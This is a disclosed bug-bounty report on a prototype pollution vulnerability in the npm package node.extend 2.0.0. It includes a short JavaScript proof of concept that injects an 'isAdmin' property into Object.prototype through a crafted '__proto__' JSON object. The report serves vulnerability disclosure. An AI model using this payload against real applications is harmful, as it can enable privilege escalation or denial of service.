# Prototype pollution attack in node.extend

## Report Details
- **Report ID**: 430831
- **URL**: https://hackerone.com/reports/430831
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-10-30T11:42:18.593Z
- **Disclosed**: 2018-11-30T14:01:57.458Z

## Reporter
- **Username**: asgerf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a prototype pollution vulnerability in node.extend.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** node.extend
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/node.extend`

## Module Description

A port of jQuery.extend that actually works on node.js

## Module Stats

267,701 downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

`node.extend` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
Craft an object of form `{__proto__: {...}}` and send it to `node.extend`:
```javascript
let extend = require('node.extend');
extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N]
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

## Attachments
No attachments
